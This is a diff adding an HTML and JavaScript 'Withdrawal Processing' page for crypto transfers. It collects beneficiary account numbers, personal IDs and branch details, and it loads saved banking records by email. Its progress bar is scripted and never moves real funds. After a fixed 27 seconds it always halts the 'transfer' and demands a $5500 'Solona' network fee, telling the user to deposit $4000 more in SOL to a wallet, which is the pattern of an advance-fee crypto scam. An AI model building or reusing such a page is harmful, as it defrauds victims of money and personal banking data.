@@ -1,0 +1,355 @@
+                                                                            <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Withdrawal Processing</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <style>
+    :root{--panel-padding:16px}
+    body{margin:0;padding:20px;font-family:Inter,system-ui,Arial,Helvetica,sans-serif;background:var(--bg, #fafafa);color:var(--text,#111)}
+    .wrap{max-width:980px;margin:0 auto;padding:12px}
+    .card{background:var(--card,#fff);border:1px solid var(--border,#e6e6e6);padding:var(--panel-padding);border-radius:10px;margin-bottom:16px;box-shadow:0 1px 4px rgba(12,20,30,0.04)}
+    h2,h3{margin:0 0 8px 0}
+    label{display:block;margin-top:10px;font-weight:600;color:var(--muted)}
+    input,select,textarea{width:100%;padding:10px;margin-top:6px;border:1px solid var(--border);border-radius:8px;background:var(--input-bg,#fff);box-sizing:border-box}
+    .grid{display:grid;grid-template-columns:1fr;gap:12px}
+    @media(min-width:720px){.grid{grid-template-columns:1fr 1fr}}
+    .progress{height:14px;background:var(--border);border-radius:999px;overflow:hidden}
+    .progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent,#0b76ef),#2ea0ff)}
+    .controls{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
+    button{padding:9px 12px;border:0;background:var(--accent,#0b76ef);color:#fff;border-radius:8px;cursor:pointer}
+    button[disabled]{opacity:0.6;cursor:not-allowed}
+    .status{font-weight:700;margin-left:10px;text-transform:capitalize}
+    /* Keep long strings from overflowing */
+    .wrap, input, textarea, select, .withdrawal-details {word-break:break-word;overflow-wrap:break-word}
+    .summary-row{display:flex;justify-content:space-between;padding:6px 0;font-size:14px}
+    @media(max-width:520px){.summary-row{flex-direction:column;gap:6px}}
+    /* Modal styles */
+    .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center}
+    .modal-overlay.active{display:flex}
+    .modal-content{background:var(--card,#fff);border:1px solid var(--border,#e6e6e6);padding:24px;border-radius:10px;max-width:500px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.2)}
+    .modal-content p{margin:12px 0;line-height:1.5}
+    .modal-content strong{font-weight:600}
+    .modal-close-btn{position:absolute;top:16px;right:16px;background:none;border:none;font-size:24px;cursor:pointer;color:var(--muted);padding:0;width:32px;height:32px;display:flex;align-items:center;justify-content:center}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h2>Withdrawal processing</h2>
+
+    <div class="card">
+      <h3>Transfer info</h3>
+      <label for="digital">Digital currency transfer</label>
+      <select id="digital" name="digital" autocomplete="off">
+        <option value="">Select currency</option>
+        <option>BTC</option>
+        <option>ETH</option>
+        <option>USDT</option>
+        <option>USDC</option>
+        <option>XRP</option>
+      </select>
+      <div class="grid">
+        <div>
+          <label for="tdate">Date</label>
+          <input id="tdate" type="date" name="tdate" />
+        </div>
+        <div>
+          <label for="destCountry">Destination country</label>
+          <input id="destCountry" name="destCountry" placeholder="Country" autocomplete="country-name" />
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>Beneficiary account</h3>
+      <div class="grid">
+        <div>
+          <label for="benAcct">Account number</label>
+          <input id="benAcct" name="benAcct" autocomplete="off" />
+        </div>
+        <div>
+          <label for="benName">Account name</label>
+          <input id="benName" name="benName" autocomplete="name" />
+        </div>
+      </div>
+      <label for="benId">Personal ID</label>
+      <input id="benId" name="benId" autocomplete="off" />
+      <label for="benBranch">Branch</label>
+      <input id="benBranch" name="benBranch" autocomplete="off" />
+    </div>
+
+    <div class="card">
+      <h3>Summary</h3>
+      <div id="summary">
+        <div class="summary-row"><div>Digital currency:</div><div id="s-digital">-</div></div>
+        <div class="summary-row"><div>Date:</div><div id="s-date">-</div></div>
+        <div class="summary-row"><div>Destination country:</div><div id="s-dest">-</div></div>
+        <div style="margin-top:8px"><strong>Beneficiary:</strong>
+          <div class="summary-row"> <div>Account number</div><div id="s-benAcct">-</div></div>
+          <div class="summary-row"> <div>Account name</div><div id="s-benName">-</div></div>
+          <div class="summary-row"> <div>Personal ID</div><div id="s-benId">-</div></div>
+          <div class="summary-row"> <div>Branch</div><div id="s-benBranch">-</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>Other details & progress</h3>
+      <label for="notes">Transfer details / notes</label>
+      <textarea id="notes" name="notes" rows="3" autocomplete="off"></textarea>
+
+      <div style="margin-top:12px">
+        <div style="display:flex;align-items:center">
+          <div style="flex:1">
+            <div class="progress"><i id="bar"></i></div>
+          </div>
+          <div class="status" id="status">pending</div>
+        </div>
+        <div class="controls">
+          <button id="start">Start transfer</button>
+          <button id="cancel" style="background:#d33">Cancel</button>
+        </div>
+      </div>
+    </div>
+
+      <div id="feeAlertContainer" class="modal-overlay">
+        <div class="modal-content" id="feeAlert">
+          <button class="modal-close-btn" id="feeAlertClose" type="button">&times;</button>
+          <p><strong>Withdrawal Interrupted: Insufficient Network Charges</strong></p>
+          <p>A network fee of <strong id="feeRequired">$5500.00</strong> is required to cover "Solona" blockchain charges for this transaction.</p>
+          <p>Amount paid so far: <strong id="feePaid">$1500.00</strong>. Remaining: <strong id="feeRemaining">$4000.00</strong>.</p>
+          <div class="progress" aria-hidden="true" style="height:10px;margin-top:8px;">
+            <i id="feeBar" style="background:linear-gradient(90deg,#ffd56b,#ffa500);width:0;height:100%"></i>
+          </div>
+          <p style="font-size:0.9em;margin-top:6px;" id="feePct">27% of network fee paid</p>
+          <p>Please deposit the remaining amount of <strong id="feeRemaining2">$4000.00</strong> worth of <strong>Solona</strong> (SOL) to the designated wallet to successfully complete your withdrawal.</p>
+          <div style="margin-top:16px;display:flex;gap:8px">
+            <button id="payFeeBtn" class="btn">Simulate Pay Remaining Fee</button>
+            <button id="cancelFeeBtn" class="btn" style="background:#d33">Cancel Withdrawal</button>
+          </div>
+        </div>
+      </div>
+  </div>
+
+  <script>
+    // Helper functions to show/hide fee alert modal
+    function showFeeAlert(){
+      const overlay = document.getElementById('feeAlertContainer');
+      if(overlay) overlay.classList.add('active');
+    }
+
+    function hideFeeAlert(){
+      const overlay = document.getElementById('feeAlertContainer');
+      if(overlay) overlay.classList.remove('active');
+    }
+
+    // Load saved banking data from localStorage
+    function loadBankingDataFromStorage(){
+      try{
+        const saved = JSON.parse(localStorage.getItem('banking')||'{}');
+        if(saved){
+          if(!document.getElementById('benAcct').value && saved.acctNumber) 
+            document.getElementById('benAcct').value = saved.acctNumber;
+          if(!document.getElementById('benName').value && saved.acctName) 
+            document.getElementById('benName').value = saved.acctName;
+          if(!document.getElementById('benId').value && saved.personalId) 
+            document.getElementById('benId').value = saved.personalId;
+          if(!document.getElementById('benBranch').value && saved.branch) 
+            document.getElementById('benBranch').value = saved.branch;
+          if(!document.getElementById('destCountry').value && saved.country) 
+            document.getElementById('destCountry').value = saved.country;
+          populateSummary();
+        }
+      }catch(e){console.warn('Failed to load banking data from localStorage',e)}
+    }
+
+    const bar = document.getElementById('bar');
+    const statusEl = document.getElementById('status');
+    // When developing with a static dev server (e.g. live-server on :5500),
+    // the backend runs on port 5001. Use `apiBase` so fetches target the
+    // Node backend when served from localhost.
+    const apiBase = (location.hostname === 'localhost' || location.hostname === '127.0.0.1')
+      ? `http://${location.hostname}:5001`
+      : '';
+    let pct = 0; let timer = null;
+
+    function setPct(v){ pct = Math.max(0, Math.min(100, v)); bar.style.width = pct + '%'; }
+
+    function populateSummary(){
+      document.getElementById('s-digital').textContent = document.getElementById('digital').value || '-';
+      document.getElementById('s-date').textContent = document.getElementById('tdate').value || '-';
+      document.getElementById('s-dest').textContent = document.getElementById('destCountry').value || '-';
+      document.getElementById('s-benAcct').textContent = document.getElementById('benAcct').value || '-';
+      document.getElementById('s-benName').textContent = document.getElementById('benName').value || '-';
+      document.getElementById('s-benId').textContent = document.getElementById('benId').value || '-';
+      document.getElementById('s-benBranch').textContent = document.getElementById('benBranch').value || '-';
+    }
+
+    function startTransfer(){
+      if(timer) return;
+      populateSummary();
+      statusEl.textContent = 'transferring';
+      // load at ~3% per second (3/sec -> 3 percentage points per second)
+      timer = setInterval(()=>{
+        setPct(pct + 3);
+        if(pct >= 100){
+          clearInterval(timer); timer = null; statusEl.textContent = 'completed';
+        }
+      }, 1000);
+      // disable start while running
+      document.getElementById('start').disabled = true;
+      // Show fee alert after 27 seconds if network fees insufficient
+        const feeTimer = setTimeout(() => {
+          const feeCard = document.getElementById('feeAlert');
+          if (!feeCard) return;
+          // pause transfer simulation
+          pauseTransferForFee();
+          showFeeAlert();
+          // animate fee bar to 27%
+          const feeBar = document.getElementById('feeBar');
+          if (feeBar) {
+            feeBar.style.transition = 'width 1.5s ease';
+            requestAnimationFrame(()=> feeBar.style.width = '27%');
+          }
+          const feePct = document.getElementById('feePct');
+          if (feePct) feePct.textContent = '27% of network fee paid';
+
+          // hook up pay and cancel buttons
+          const payBtn = document.getElementById('payFeeBtn');
+          const cancelBtn = document.getElementById('cancelFeeBtn');
+          if (payBtn) {
+            payBtn.onclick = async () => {
+              // simulate paying remaining fee: animate to 100%
+              if (feeBar) {
+                feeBar.style.transition = 'width 1.2s ease';
+                feeBar.style.width = '100%';
+              }
+              if (document.getElementById('feePct')) document.getElementById('feePct').textContent = '100% of network fee paid';
+              // after animation, hide alert and resume transfer
+              setTimeout(()=>{
+                hideFeeAlert();
+                resumeTransferAfterFee();
+              }, 1400);
+            };
+          }
+          if (cancelBtn) {
+            cancelBtn.onclick = () => {
+              // cancel full transfer
+              cancelTransfer();
+              hideFeeAlert();
+              statusEl.textContent = 'cancelled';
+            };
+          }
+          // Close button handler
+          const closeBtn = document.getElementById('feeAlertClose');
+          if (closeBtn) {
+            closeBtn.onclick = () => {
+              hideFeeAlert();
+            };
+          }
+        }, 27000);
+    }
+
+    function cancelTransfer(){
+      if(timer) clearInterval(timer);
+      timer = null; statusEl.textContent = 'cancelled';
+      document.getElementById('start').disabled = false;
+    }
+
+    // Pause transfer when fee alert appears
+    let interrupted = false;
+    let interruptedPct = 0;
+    function pauseTransferForFee(){
+      if(timer) {
+        clearInterval(timer);
+        timer = null;
+        interrupted = true;
+        interruptedPct = pct;
+        statusEl.textContent = 'interrupted';
+        document.getElementById('start').disabled = true;
+      }
+    }
+
+    function resumeTransferAfterFee(){
+      if(!interrupted) return startTransfer();
+      interrupted = false;
+      // resume from interruptedPct
+      setPct(interruptedPct);
+      statusEl.textContent = 'transferring';
+      timer = setInterval(()=>{
+        setPct(pct + 3);
+        if(pct >= 100){
+          clearInterval(timer); timer = null; statusEl.textContent = 'completed';
+          document.getElementById('start').disabled = false;
+        }
+      }, 1000);
+    }
+
+    document.getElementById('start').addEventListener('click', startTransfer);
+    document.getElementById('cancel').addEventListener('click', cancelTransfer);
+
+    // reset on load
+    setPct(0);
+    statusEl.textContent = 'pending';
+
+    // Populate fields from query params (when navigated from withdrawals page)
+    function populateFromQuery(){
+      const params = new URLSearchParams(window.location.search);
+      if(!params) return;
+      const wId = params.get('id');
+      const crypto = params.get('crypto');
+      const amount = params.get('amount');
+      const addr = params.get('address');
+      const dest = params.get('country');
+      const benAcct = params.get('benAcct');
+      const benName = params.get('benName');
+
+      if(crypto) document.getElementById('digital').value = crypto;
+      if(params.get('date')) document.getElementById('tdate').value = params.get('date');
+      if(dest) document.getElementById('destCountry').value = dest;
+      if(benAcct) document.getElementById('benAcct').value = benAcct;
+      if(benName) document.getElementById('benName').value = benName;
+      if(params.get('id')){
+        // auto-start transfer simulation when an id is present
+        statusEl.textContent = 'transferring';
+        setPct(3);
+        // ensure summary reflects query values
+        populateSummary();
+        startTransfer();
+      }
+
+        // If beneficiary info missing, try to fetch from saved banking info by email
+        // Prefer query param benAcct/benName; if not present and user email available, fetch from /api/banking
+        const hasBen = document.getElementById('benAcct').value || document.getElementById('benName').value;
+        if (!hasBen) {
+          // try to get email from AuthService or localStorage
+          (async ()=>{
+            try{
+              let email = null;
+              if (window.AuthService && typeof AuthService.getUser === 'function'){
+                const u = AuthService.getUser(); if(u && u.email) email = u.email;
+              }
+              if(!email) email = (localStorage.getItem('banking') && JSON.parse(localStorage.getItem('banking')).email) || localStorage.getItem('currentUserEmail') || localStorage.getItem('email');
+              if(!email) return;
+              const resp = await fetch(apiBase + `/api/banking?email=${encodeURIComponent(email)}`);
+              if(!resp.ok) return;
+              const data = await resp.json();
+              const entry = data.entry;
+              if(entry){
+                if(entry.acctNumber) document.getElementById('benAcct').value = entry.acctNumber;
+                if(entry.acctName) document.getElementById('benName').value = entry.acctName;
+                if(entry.personalId) document.getElementById('benId').value = entry.personalId;
+                if(entry.branch) document.getElementById('benBranch').value = entry.branch;
+                populateSummary();
+              }
+            }catch(e){console.warn('Failed to fetch saved banking',e)}
+          })();
+        }
+    }
+
+    populateFromQuery();
+    loadBankingDataFromStorage();
+  </script>
+</body>
+</html>
